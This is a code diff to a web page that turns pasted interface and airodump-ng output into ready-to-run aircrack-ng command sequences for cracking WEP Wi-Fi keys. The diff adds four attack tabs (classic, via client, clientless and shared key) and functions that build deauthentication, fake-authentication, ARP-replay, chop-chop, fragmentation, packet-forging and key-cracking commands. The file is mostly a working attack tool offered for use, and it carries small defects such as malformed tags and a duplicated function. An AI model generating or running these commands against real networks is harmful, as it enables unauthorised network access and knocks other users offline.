@@ -1,11 +1,51 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Classic WEP Attack</title>
+  <title>WEP</title>
+  <style>
+body {font-family: Arial;}
+
+/* Style the tab */
+.tab {
+  overflow: hidden;
+  border: 1px solid #ccc;
+  background-color: #f1f1f1;
+}
+
+/* Style the buttons inside the tab */
+.tab button {
+  background-color: inherit;
+  float: left;
+  border: none;
+  outline: none;
+  cursor: pointer;
+  padding: 14px 16px;
+  transition: 0.3s;
+  font-size: 17px;
+}
+
+/* Change background color of buttons on hover */
+.tab button:hover {
+  background-color: #ddd;
+}
+
+/* Create an active/current tablink class */
+.tab button.active {
+  background-color: #ccc;
+}
+
+/* Style the tab content */
+.tabcontent {
+  display: none;
+  padding: 6px 12px;
+  border: 1px solid #ccc;
+  border-top: none;
+}
+</style>
 </head>
 <body>
 <form id="frm1">
-	ip link show <br>
+	ip link show<br>
 	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus><br>
 	<p id="searchCommand"></p><br>
 	<input type="text" id="airodumpInput" style="width:100%" autofocus><br>
@@ -14,8 +54,57 @@
 	<input type="button" onclick="myFunction()" value="Submit">
 </form>
 <p id="output"></p>
-<script>
 
+<div class="tab">
+  <button class="tablinks" onclick="openTab(event, 'Classic WEP')">Classic WEP</button>
+  <button class="tablinks" onclick="openTab(event, 'WEP via Client')">WEP via Client</button>
+  <button class="tablinks" onclick="openTab(event, 'Clientless WEP')">Clientless WEP</button>
+  <button class="tablinks" onclick="openTab(event, 'Shared Key WEP')">Shared Key WEP</button>
+</div>
+
+<!-- Tab content -->
+<div id="Classic WEP" class="tabcontent">
+  <h3>Classic WEP</h3>
+  <p id="classicWEPoutput"></</p>
+</div>
+
+<div id="WEP via Client" class="tabcontent">
+  <h3>WEP via Client</h3>
+  <p id="wepViaClientOutput"></</p>
+</div>
+
+<div id="Clientless WEP" class="tabcontent">
+  <h3>Clientless WEP</h3>
+  <p id="clientlessWEPoutput"></</p>
+</div>
+
+<div id="Shared Key WEP" class="tabcontent">
+  <h3>Shared Key WEP</h3>
+  <p id="sharedKeyWEPoutput"></</p>
+</div>
+
+
+<script>
+function openTab(evt, cityName) {
+  // Declare all variables
+  var i, tabcontent, tablinks;
+
+  // Get all elements with class="tabcontent" and hide them
+  tabcontent = document.getElementsByClassName("tabcontent");
+  for (i = 0; i < tabcontent.length; i++) {
+    tabcontent[i].style.display = "none";
+  }
+
+  // Get all elements with class="tablinks" and remove the class "active"
+  tablinks = document.getElementsByClassName("tablinks");
+  for (i = 0; i < tablinks.length; i++) {
+    tablinks[i].className = tablinks[i].className.replace(" active", "");
+  }
+
+  // Show the current tab, and add an "active" class to the button that opened the tab
+  document.getElementById(cityName).style.display = "block";
+  evt.currentTarget.className += " active";
+} 
 	
 function myFunction() {
 	var airodumpInput = document.getElementById("airodumpInput").value.trim().replace(/\s\s+/g, ' ');
@@ -32,17 +121,41 @@ function myFunction() {
 	deviceName = deviceName.substring(0, deviceName.length - 1);
 	var mac = ipSplit[16].toUpperCase()
 	
-	
-	
 	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP`
 		
-	
-
-	document.getElementById("output").innerHTML = 
+	document.getElementById("classicWEPoutput").innerHTML = 
 		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
 		+ monitorMode(deviceName, channel) + "<br>"
 		+ captureCommand(deviceName, channel, apMac) + "<br>" 
 		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
+		+ arpRelay(apMac, mac, deviceName) + "<br>" 
+		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
+		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+		
+	document.getElementById("clientlessWEPoutput").innerHTML = 
+		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
+		+ monitorMode(deviceName, channel) + "<br>"
+		+ captureCommand(deviceName, channel, apMac) + "<br>" 
+		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
+		+ chopChopAttack(apMac, mac, deviceName) + " OR         "   + fragmentationAttack(apMac, mac, deviceName) + "<br>"    
+		+ packetForge(apMac, mac, deviceName) + "<br>"       
+		+ replayAttack(deviceName) + "<br>"                 
+		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+		
+	document.getElementById("wepViaClientOutput").innerHTML = 
+		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
+		+ monitorMode(deviceName, channel) + "<br>"
+		+ captureCommand(deviceName, channel, apMac) + "<br>" 
+		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
+		+ packetReplayAttack(apMac, deviceName) + "<br>"
+		+ "sudo aircrack-ng -z `ls -t cap1*.cap | head -1`";
+		
+	document.getElementById("sharedKeyWEPoutput").innerHTML = 
+		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
+		+ monitorMode(deviceName, channel) + "<br>"
+		+ captureCommand(deviceName, channel, apMac) + "<br>" 
+		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
+		+ fakeAuthSK(ssid, apMac, mac, deviceName) + "<br>" 
 		+ arpRelay(apMac, mac, deviceName) + "<br>" 
 		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
 		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
@@ -58,6 +171,43 @@ function monitorMode(device, channel) {
 
 function fakeAuth(ssid, apMac, mac, device) {
 	return `sudo aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
+}
+
+function arpRelay(apMac, mac, device) {
+	return `sudo aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
+}
+
+function deauthAttack(apMac, victimMac, device) {
+	if (victimMac.length > 0) {
+		return `sudo aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
+	} else {
+		return `sudo aireplay-ng -0 1 -a ${apMac} ${device}`
+	}
+}
+
+function chopChopAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -4 -b ${apMac} -h ${mac} ${device}`
+}
+
+function fragmentationAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -5 -b ${apMac} -h ${mac} ${device}`
+}
+
+function packetForge(apMac, mac, device) {
+	return `sudo packetforge-ng -0 -a ${apMac} -h ${mac} -l 192.168.1.100 -k 192.168.1.255 -y \`ls -t *.xor | head -1\` -w arpRequest`
+}
+
+
+function replayAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -2 -r arpRequest ${device}`
+}
+
+function packetReplayAttack(apMac, device) {
+	return `sudo aireplay-ng -2 -b ${apMac} -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${device}`
+}
+
+function fakeAuthSK(ssid, apMac, mac, device) {
+	return `sudo aireplay-ng -1 0 -e ${ssid} -y \`ls -t *.xor | head -1\` -a ${apMac} -h ${mac} ${device}`
 }
 
 function arpRelay(apMac, mac, device) {
